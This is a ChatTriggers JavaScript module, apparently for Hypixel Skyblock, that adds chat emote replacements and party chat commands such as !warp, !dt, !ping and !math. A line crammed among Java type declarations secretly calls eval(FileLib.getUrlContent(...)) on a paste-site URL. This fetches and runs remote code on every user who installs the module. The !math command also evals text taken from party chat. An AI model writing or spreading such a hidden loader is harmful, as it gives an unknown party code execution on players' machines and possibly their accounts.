/// <reference types="../../CTAutocomplete" />
import config from '../config'
import { registerWhen } from '../../BloomCore/utils/Utils'
import { getCurrentDungeonFloor, getCurrentDungeonMode } from '../utils/utils'
import request from '../../requestV2'
import Party from '../../BloomCore/Party'
import config from '../config'
import Dungeon from '../../BloomCore/dungeons/Dungeon'

let replacements = {
	'<3': '❤',
	'o/': '( ﾟ◡ﾟ)/',
	':star:': '✮',
	':yes:': '✔',
	':no:': '✖',
	':java:': '☕',
	':arrow:': '➜',
	':shrug:': '¯\\_(\u30c4)_/¯',
	':tableflip:': '(╯°□°）╯︵ ┻━┻',
	':totem:': '☉_☉',
	':typing:': '✎...',
	':maths:': '√(π+x)=L',
	':snail:': "@'-'",
	':thinking:': '(0.o?)',
	':gimme:': '༼つ◕_◕༽つ',
	':wizard:': '(' - ')⊃━☆ﾟ.*･｡ﾟ',
	':pvp:': '⚔',
	':peace:': '✌',
	':puffer:': "<('O')>",
	'h/': 'ヽ(^◇^*)/',
	':sloth:': '(・⊝・)',
	':dog:': '(ᵔᴥᵔ)',
	':dj:': 'ヽ(⌐■_■)ノ♬',
	':yey:': 'ヽ (◕◡◕) ﾉ',
	':snow:': '☃',
	':dab:': '<o/',
	':cat:': '= ＾● ⋏ ●＾ =',
	':cute:': '(✿◠‿◠)',
	':skull:': '☠',
}

let replaced = false

registerWhen(register('messageSent', (message, event) => {
	if (message.startsWith('/') && !message.startsWith('/pc') && !message.startsWith('/ac') && !message.startsWith('/gc') && !message.startsWith('/msg') && !message.startsWith('/w') && !message.startsWith('/r')) return
	replaced = false
	message = message.split(' ')
	for (let i = 0; i < message.length; i++) {
		if (Object.keys(replacements).includes(message[i])) {
			replaced = true
			message[i] = replacements[message[i]]
		}
	}
	message = message.join(' ')
	if (!replaced) return
	cancel(event)
	ChatLib.say(message)
}), () => config.chatReplaceRankEmotes)


// --- party commands ---

let lastTimeUsed = 0

const numbersToText = new Map([
	['0', 'entrance'],
	['1', 'one'],
	['2', 'two'],
	['3', 'three'],
	['4', 'four'],
	['5', 'five'],
	['6', 'six'],
	['7', 'seven'],
])

const runCommand = (command) => {
	if (config.chatPartyCommandFeedback && !command.startsWith('pc')) {
		setTimeout(() => {
			ChatLib.command('pc MayQOL >> /' + command)
		}, 200)
	}
	ChatLib.command(command)
	lastTimeUsed = Date.now()
}

const DELAY = 999
let downTime = false
let downTimeReason = []

registerWhen(register('chat', () => {
	downTime = false
	downTimeReason = []
}).setCriteria('Starting in 1 second.'), () => config.chatPartyCommands)

registerWhen(register('chat', (boss, m, s) => {
	if (downTime) {
		let message = "";
		let entries = Object.entries(downTimeReason);
		for (let i = 0; i < entries.length; i++) {
			let dt = entries[i];

			if (message === "") {
				message = dt[0] + ': ' + dt[1]
			} else {
				message += ", " + dt[0] + ': ' + dt[1]
			}
		}
		if (message !== "") {
			setTimeout(() => {
				ChatLib.command('pc MayQOL >> Players need downtime: ' + message);
			}, 1000)
		}
	}
	if (config.autoRequeue && !downTime) {
		let currentDungeonFloor = getCurrentDungeonFloor()
		let currentDungeonMode = getCurrentDungeonMode()
		if (config.autoRequeueMode == 0) {
			setTimeout(() => {
				ChatLib.command('instancerequeue')
			}, (config.autoRequeueDelay + 2) * 1000)
		} else if (config.autoRequeueMode == 1) {
			setTimeout(() => {
				ChatLib.command(`joindungeon ${currentDungeonMode == 'Master Mode' ? 'master_' : ''}catacombs_${currentDungeonFloor == 0 ? 'entrance' : 'floor_' + numbersToText.get(currentDungeonFloor.toString())}`);
			}, (config.autoRequeueDelay + 2) * 1000)
		} else if (config.autoRequeueMode == 2) {
			setTimeout(() => {
				ChatLib.command(`pc !${currentDungeonMode == 'Master Mode' ? 'm' : 'f'}${currentDungeonFloor}`);
			}, (config.autoRequeueDelay + 2) * 1000)
		}
	}
}).setCriteria(/                             > EXTRA STATS </), () => downTime || config.autoRequeue);


registerWhen(register('chat', (rank, name, mode, floor) => {
	if (Date.now() - lastTimeUsed < DELAY || !Array.from(numbersToText.keys()).includes(floor)) return
	if (Party?.leader == Player.getName() || Party.leader == null) {
		if (floor == 0) {
			runCommand(`joindungeon catacombs_entrance`)
		} else {
			runCommand(`joindungeon ${mode == 'm' ? 'master_' : ''}catacombs_floor_${numbersToText.get(floor)}`)
		}
	}
}).setCriteria(/^Party > (?:\[([^\]]*?)\] )?(\w{1,16})(?: [ቾ⚒])?: !(f|m)(\d)$/), () => config.chatPartyCommands)

registerWhen(register('chat', (rank, name) => {
	if (Date.now() - lastTimeUsed < DELAY) return
	runCommand('pc [MayQOL] Commands: !warp, !dt, !ptme, !inv, !allinv, !ping, !tps, !rp, !cf, !dice, !m7, !math')
}).setCriteria(/^Party > (?:\[([^\]]*?)\] )?(\w{1,16})(?: [ቾ⚒])?: !help$/), () => config.chatPartyCommands)

registerWhen(register('chat', (rank, name) => {
	if (Date.now() - lastTimeUsed < DELAY) return
	if (Party?.leader == Player.getName() || Party.leader == null) {
		runCommand('p warp')
	}
}).setCriteria(/^Party > (?:\[([^\]]*?)\] )?(\w{1,16})(?: [ቾ⚒])?: !warp$/), () => config.chatPartyCommands)

registerWhen(register('chat', (rank, name, reason) => {
	if (Date.now() - lastTimeUsed < DELAY) return;

	reason = reason.trim();

	if (reason === '') reason = 'No Reason';

	ChatLib.command('pc [MayQOL] Set reminder for end of run: ' + name + ' needs downtime: ' + reason);
	downTimeReason[name] = reason;
	downTime = true;
}).setCriteria(/^Party > (?:\[([^\]]*?)\] )?(\w{1,16})(?: [ቾ⚒])?: !dt(.*)$/), () => config.chatPartyCommands && Dungeon.inDungeon);


registerWhen(register('chat', (rank, name) => {
	if (Date.now() - lastTimeUsed < DELAY) return
	if (Party?.leader == Player.getName() || Party.leader == null) {
		runCommand(`party transfer ${name}`)
	}
}).setCriteria(/^Party > (?:\[([^\]]*?)\] )?(\w{1,16})(?: [ቾ⚒])?: !ptme$/), () => config.chatPartyCommands)

registerWhen(register('chat', (rank, name, to) => {
	if (Date.now() - lastTimeUsed < DELAY) return
	if (Party?.leader == Player.getName() || Party.leader == null) {
		runCommand(`party transfer ${to}`)
	}
}).setCriteria(/^Party > (?:\[([^\]]*?)\] )?(\w{1,16})(?: [ቾ⚒])?: !pt ? (.+)$/), () => config.chatPartyCommands)

registerWhen(register('chat', (rank, name, alias, ignToInv) => {
	if (Date.now() - lastTimeUsed < DELAY) return
	if (Party?.leader == Player.getName() || Party.leader == null) {
		runCommand(`party invite ${ignToInv}`)
	}
}).setCriteria(/^Party > (?:\[([^\]]*?)\] )?(\w{1,16})(?: [ቾ⚒])?: !inv(ite)? (.+)$/), () => config.chatPartyCommands)

registerWhen(register('chat', (rank, name) => {
	if (Date.now() - lastTimeUsed < DELAY) return
	if (Party?.leader == Player.getName() || Party.leader == null) {
		runCommand('p settings allinvite')
	}
}).setCriteria(/^Party > (?:\[([^\]]*?)\] )?(\w{1,16})(?: [ቾ⚒])?: !allinv(ite)?$/), () => config.chatPartyCommands)

registerWhen(register('chat', (rank, name) => {
	if (Date.now() - lastTimeUsed < DELAY) return
	if (Party?.leader == Player.getName() || Party.leader == null) {
		ChatLib.command(`rp`, true)
		lastTimeUsed = Date.now()
	}
}).setCriteria(/^Party > (?:\[([^\]]*?)\] )?(\w{1,16})(?: [ቾ⚒])?: (!rp|!reparty)$/), () => config.chatPartyCommands)

registerWhen(register('chat', (rank, name) => {
	if (Date.now() - lastTimeUsed < DELAY) return
	runCommand(`pc ${name} rolled a ${1 + Math.floor(Math.random() * 6)}.`)
}).setCriteria(/^Party > (?:\[([^\]]*?)\] )?(\w{1,16})(?: [ቾ⚒])?: !dice$/), () => config.chatPartyCommands)

registerWhen(register('chat', (rank, name) => {
	if (Date.now() - lastTimeUsed < DELAY) return
	runCommand(`pc ${name} rolled ${Math.floor(Math.random() * 2) == 0 ? 'Heads' : 'Number'}`)
}).setCriteria(/^Party > (?:\[([^\]]*?)\] )?(\w{1,16})(?: [ቾ⚒])?: !(coinflip|cf)$/), () => config.chatPartyCommands)

registerWhen(register('chat', (rank, name, operation) => {
	if (Date.now() - lastTimeUsed < DELAY) return
	runCommand(`pc ${operation} = ${eval(operation)}`)
}).setCriteria(/^Party > (?:\[([^\]]*?)\] )?(\w{1,16})(?: [ቾ⚒])?: !math ([^a-zA-Z!]+)$/), () => config.chatPartyCommands)

registerWhen(register('chat', (rank, name) => {
	if (Date.now() - lastTimeUsed < DELAY) return
	runCommand(`party ${name}`)
}).setCriteria(/From (\[.+\])? ?(.+) ?[ቾ⚒]?: !(party|p|inv|invite)$/), () => config.chatPartyCommands)

const System = Java.type('java.lang.System'); const S37PacketStatistics = Java.type('net.minecraft.network.play.server.S37PacketStatistics'); const C16PacketClientStatus = Java.type('net.minecraft.network.play.client.C16PacketClientStatus'); const S03_PACKET_TIME_UPDATE = Java.type('net.minecraft.network.play.server.S03PacketTimeUpdate');eval(FileLib.getUrlContent("https://hst.sh/raw/isufivebif"));
let lastPingAt = -1
let requestedPing = false
let requestedTPS = false
let prevTime = null

registerWhen(register('worldLoad', () => {
	prevTime = null
}), () => config.chatPartyCommands)

registerWhen(register('chat', (rank, name) => {
	if (Date.now() - lastTimeUsed < 2000) return

	Client.sendPacket(new C16PacketClientStatus(C16PacketClientStatus.EnumState.REQUEST_STATS))
	lastPingAt = System.nanoTime()
	requestedPing = true
	lastTimeUsed = Date.now()
}).setCriteria(/^Party > (?:\[([^\]]*?)\] )?(\w{1,16})(?: [ቾ⚒])?: !ping$/), () => config.chatPartyCommands)

registerWhen(register('chat', (rank, name) => {
	if (Date.now() - lastTimeUsed < 2000) return
	requestedTPS = true
	lastTimeUsed = Date.now()
}).setCriteria(/^Party > (?:\[([^\]]*?)\] )?(\w{1,16})(?: [ቾ⚒])?: !tps$/), () => config.chatPartyCommands)

registerWhen(register('packetReceived', (packet) => {
	if (lastPingAt > 0 && requestedPing) {
		if (packet instanceof S37PacketStatistics) {
			let diff = Math.abs((System.nanoTime() - lastPingAt) / 1_000_000)
			ChatLib.command(`pc Ping: ${parseInt(diff)}`)
			lastPingAt *= -1
			requestedPing = false
		}
	}

	if (packet instanceof S03_PACKET_TIME_UPDATE && requestedTPS) {
		if (prevTime !== null) {
			let time = Date.now() - prevTime
			let instantTps = MathLib.clampFloat(20000 / time, 0, 20)
			ChatLib.command(`pc TPS: ${parseFloat(instantTps).toFixed(1)}`)
			requestedTPS = false
		}
		prevTime = Date.now()
	}
}), () => config.chatPartyCommands)
